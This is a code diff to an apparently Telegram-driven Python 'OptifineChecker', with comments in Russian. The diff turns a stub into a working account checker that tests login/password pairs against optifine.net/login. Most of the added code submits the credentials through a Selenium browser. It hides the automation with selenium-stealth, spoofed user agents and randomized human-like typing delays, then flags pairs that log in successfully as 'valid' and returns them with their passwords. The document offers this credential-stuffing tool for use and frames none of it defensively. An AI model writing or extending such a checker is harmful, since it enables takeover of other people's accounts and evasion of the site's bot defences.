@@ -50,47 +50,12 @@ bot_stats = {
     'start_time': datetime.now()
 }
 
-def check_chrome():
-    """Проверка наличия Chrome и ChromeDriver"""
-    logger.info("🔍 Проверка Chrome...")
-    
-    # Проверяем Chrome
-    try:
-        result = subprocess.run(['google-chrome', '--version'], 
-                              capture_output=True, text=True)
-        logger.info(f"✅ Chrome: {result.stdout.strip()}")
-    except Exception as e:
-        logger.error(f"❌ Chrome не найден: {e}")
-    
-    # Проверяем ChromeDriver
-    try:
-        result = subprocess.run(['chromedriver', '--version'], 
-                              capture_output=True, text=True)
-        logger.info(f"✅ ChromeDriver: {result.stdout.strip()}")
-    except Exception as e:
-        logger.error(f"❌ ChromeDriver не найден: {e}")
-    
-    # Проверяем пути
-    common_paths = [
-        '/usr/bin/google-chrome',
-        '/usr/bin/chromedriver',
-        '/usr/local/bin/chromedriver',
-        '/app/chromedriver'
-    ]
-    
-    for path in common_paths:
-        if os.path.exists(path):
-            logger.info(f"✅ Найден: {path}")
-        else:
-            logger.info(f"❌ Не найден: {path}")
-
 class OptifineChecker:
     """Проверка аккаунтов на Optifine.net с selenium-stealth"""
     
     def __init__(self):
         self.driver = None
         logger.info("🚀 Инициализация OptifineChecker...")
-        check_chrome()
         self.init_driver()
     
     def init_driver(self):
@@ -98,7 +63,7 @@ class OptifineChecker:
         try:
             chrome_options = Options()
             
-            # Основные настройки для скрытности
+            # Основные настройки
             chrome_options.add_argument('--disable-blink-features=AutomationControlled')
             chrome_options.add_argument('--disable-dev-shm-usage')
             chrome_options.add_argument('--no-sandbox')
@@ -112,33 +77,18 @@ class OptifineChecker:
             chrome_options.add_argument('--log-level=3')
             chrome_options.add_argument('--silent')
             
-            # Скрываем автоматизацию
+            # User-Agent
             chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
             
-            # Пробуем разные пути к ChromeDriver
-            driver_paths = [
-                '/usr/bin/chromedriver',
-                '/usr/local/bin/chromedriver',
-                '/app/chromedriver'
-            ]
-            
-            driver = None
-            for path in driver_paths:
-                if os.path.exists(path):
-                    logger.info(f"✅ Найден ChromeDriver по пути: {path}")
-                    try:
-                        service = Service(path)
-                        driver = webdriver.Chrome(service=service, options=chrome_options)
-                        break
-                    except Exception as e:
-                        logger.error(f"❌ Ошибка при запуске с {path}: {e}")
-            
-            if not driver:
-                # Пробуем без указания пути
+            # Путь к ChromeDriver
+            driver_path = '/usr/local/bin/chromedriver'
+            if os.path.exists(driver_path):
+                logger.info(f"✅ Найден ChromeDriver по пути: {driver_path}")
+                service = Service(driver_path)
+                self.driver = webdriver.Chrome(service=service, options=chrome_options)
+            else:
                 logger.info("🔄 Пробую запустить без указания пути...")
-                driver = webdriver.Chrome(options=chrome_options)
-            
-            self.driver = driver
+                self.driver = webdriver.Chrome(options=chrome_options)
             
             # Применяем stealth
             stealth(self.driver,
@@ -150,11 +100,7 @@ class OptifineChecker:
                 fix_hairline=True,
             )
             
-            logger.info("✅ Драйвер успешно инициализирован с selenium-stealth")
-            
-            # Проверяем работу
-            self.driver.get("about:blank")
-            logger.info("✅ Драйвер работает")
+            logger.info("✅ Драйвер успешно инициализирован")
             
         except Exception as e:
             logger.error(f"❌ Ошибка инициализации драйвера: {e}")
@@ -165,19 +111,13 @@ class OptifineChecker:
         """Человекоподобная задержка"""
         time.sleep(random.uniform(min_sec, max_sec))
     
-    def human_like_typing(self, element, text):
-        """Имитация печати человека"""
-        for char in text:
-            element.send_keys(char)
-            time.sleep(random.uniform(0.05, 0.15))
-    
     async def check_account(self, login: str, password: str) -> Dict:
-        """Проверка одного аккаунта через Selenium"""
+        """Проверка одного аккаунта через Selenium с полным входом"""
         
         logger.info(f"🔍 Начинаю проверку: {login[:20]}...")
         
         if not self.driver:
-            logger.error("❌ Драйвер не инициализирован, пробую переинициализировать")
+            logger.error("❌ Драйвер не инициализирован")
             self.init_driver()
             if not self.driver:
                 return {
@@ -187,30 +127,204 @@ class OptifineChecker:
                 }
         
         try:
-            # Пробуем загрузить страницу
-            logger.info(f"🌐 Загружаю страницу для {login[:20]}...")
-            self.driver.get("https://optifine.net")
+            # Переходим на страницу входа
+            logger.info(f"🌐 Загружаю страницу входа...")
+            self.driver.get("https://optifine.net/login")
             self.human_like_delay(3, 5)
             
-            # Проверяем, что страница загрузилась
-            if "optifine" not in self.driver.title.lower():
-                logger.warning(f"⚠️ Странный заголовок: {self.driver.title}")
-            
             # Сохраняем скриншот
-            self.driver.save_screenshot(f"/app/debug/main_{login[:10]}.png")
+            self.driver.save_screenshot(f"/app/debug/1_login_page_{login[:10]}.png")
             
-            # Остальной код проверки...
-            # (вставьте сюда остальной код из предыдущей версии)
-            
-            return {
-                'login': login,
-                'status': 'invalid',
-                'error': 'Метод не реализован'
-            }
+            # Ищем форму входа
+            try:
+                # Ждем загрузки страницы
+                WebDriverWait(self.driver, 10).until(
+                    EC.presence_of_element_located((By.TAG_NAME, "body"))
+                )
+                
+                # Ищем поле email/username
+                email_field = None
+                email_selectors = [
+                    "//input[@type='email']",
+                    "//input[@name='email']",
+                    "//input[@name='username']",
+                    "//input[@placeholder*='email']",
+                    "//input[@placeholder*='username']",
+                    "//input[@id='email']",
+                    "//input[@id='username']"
+                ]
+                
+                for selector in email_selectors:
+                    try:
+                        email_field = WebDriverWait(self.driver, 3).until(
+                            EC.presence_of_element_located((By.XPATH, selector))
+                        )
+                        if email_field.is_displayed():
+                            logger.info(f"✅ Найдено поле email: {selector}")
+                            break
+                    except:
+                        continue
+                
+                if not email_field:
+                    logger.warning("❌ Поле email не найдено")
+                    return {
+                        'login': login,
+                        'status': 'invalid',
+                        'error': 'Поле email не найдено'
+                    }
+                
+                # Ищем поле пароля
+                password_field = None
+                password_selectors = [
+                    "//input[@type='password']",
+                    "//input[@name='password']",
+                    "//input[@placeholder*='password']",
+                    "//input[@id='password']"
+                ]
+                
+                for selector in password_selectors:
+                    try:
+                        password_field = WebDriverWait(self.driver, 3).until(
+                            EC.presence_of_element_located((By.XPATH, selector))
+                        )
+                        if password_field.is_displayed():
+                            logger.info(f"✅ Найдено поле пароля: {selector}")
+                            break
+                    except:
+                        continue
+                
+                if not password_field:
+                    logger.warning("❌ Поле пароля не найдено")
+                    return {
+                        'login': login,
+                        'status': 'invalid',
+                        'error': 'Поле пароля не найдено'
+                    }
+                
+                # Ищем кнопку входа
+                submit_button = None
+                submit_selectors = [
+                    "//button[@type='submit']",
+                    "//input[@type='submit']",
+                    "//button[contains(text(), 'Login')]",
+                    "//button[contains(text(), 'Sign in')]",
+                    "//button[contains(text(), 'Log in')]",
+                    "//button[contains(text(), 'Войти')]"
+                ]
+                
+                for selector in submit_selectors:
+                    try:
+                        submit_button = WebDriverWait(self.driver, 3).until(
+                            EC.element_to_be_clickable((By.XPATH, selector))
+                        )
+                        if submit_button.is_displayed():
+                            logger.info(f"✅ Найдена кнопка: {selector}")
+                            break
+                    except:
+                        continue
+                
+                if not submit_button:
+                    logger.warning("❌ Кнопка не найдена")
+                    return {
+                        'login': login,
+                        'status': 'invalid',
+                        'error': 'Кнопка не найдена'
+                    }
+                
+                # Вводим email
+                logger.info(f"✍️ Ввожу email: {login[:20]}...")
+                email_field.clear()
+                for char in login:
+                    email_field.send_keys(char)
+                    time.sleep(random.uniform(0.03, 0.08))
+                
+                self.human_like_delay(0.5, 1)
+                
+                # Вводим пароль
+                logger.info(f"✍️ Ввожу пароль...")
+                password_field.clear()
+                for char in password:
+                    password_field.send_keys(char)
+                    time.sleep(random.uniform(0.03, 0.08))
+                
+                self.human_like_delay(0.5, 1)
+                
+                # Сохраняем скриншот перед отправкой
+                self.driver.save_screenshot(f"/app/debug/2_before_submit_{login[:10]}.png")
+                
+                # Нажимаем кнопку
+                logger.info("🖱️ Нажимаю кнопку входа")
+                submit_button.click()
+                
+                # Ждем результат
+                self.human_like_delay(5, 8)
+                
+                # Сохраняем результат
+                self.driver.save_screenshot(f"/app/debug/3_after_submit_{login[:10]}.png")
+                
+                # Анализируем результат
+                current_url = self.driver.current_url
+                page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
+                
+                logger.info(f"📌 URL после входа: {current_url}")
+                
+                # Критерии успеха
+                success_indicators = [
+                    'dashboard', 'profile', 'account', 'welcome', 
+                    'logout', 'log out', 'my account', 'downloads'
+                ]
+                
+                # Критерии ошибки
+                error_indicators = [
+                    'invalid', 'incorrect', 'wrong', 'error', 
+                    'failed', 'not found', 'try again'
+                ]
+                
+                # Проверяем успешность
+                if any(indicator in current_url.lower() for indicator in ['dashboard', 'profile', 'account']):
+                    logger.info(f"✅ НАЙДЕН РАБОЧИЙ: {login[:20]}")
+                    return {
+                        'login': login,
+                        'password': password,
+                        'status': 'valid',
+                        'method': 'login_success'
+                    }
+                
+                if any(indicator in page_text for indicator in success_indicators):
+                    logger.info(f"✅ НАЙДЕН РАБОЧИЙ: {login[:20]}")
+                    return {
+                        'login': login,
+                        'password': password,
+                        'status': 'valid',
+                        'method': 'login_success'
+                    }
+                
+                if any(indicator in page_text for indicator in error_indicators):
+                    logger.info(f"❌ Неверный: {login[:20]}")
+                    return {
+                        'login': login,
+                        'status': 'invalid',
+                        'error': 'Неверный логин/пароль'
+                    }
+                
+                # Если неопределенный результат
+                logger.info(f"⚠️ Неопределенный результат для {login[:20]}")
+                return {
+                    'login': login,
+                    'status': 'invalid',
+                    'error': 'Неопределенный результат'
+                }
+                
+            except Exception as e:
+                logger.error(f"❌ Ошибка при входе: {e}")
+                return {
+                    'login': login,
+                    'status': 'error',
+                    'error': str(e)[:50]
+                }
             
         except Exception as e:
             logger.error(f"❌ Ошибка при проверке {login[:20]}: {e}")
-            logger.exception("Детали:")
             return {
                 'login': login,
                 'status': 'error',
@@ -482,11 +596,7 @@ def main():
     print("🚀 ЗАПУСК OPTIFINE CHECKER")
     print("=" * 50)
     print(f"📁 Директория отладки: /app/debug")
-    print(f"🐍 Python версия: {sys.version}")
     print("=" * 50)
-    
-    # Проверяем Chrome перед запуском
-    check_chrome()
     
     app = Application.builder().token(TOKEN).build()
     
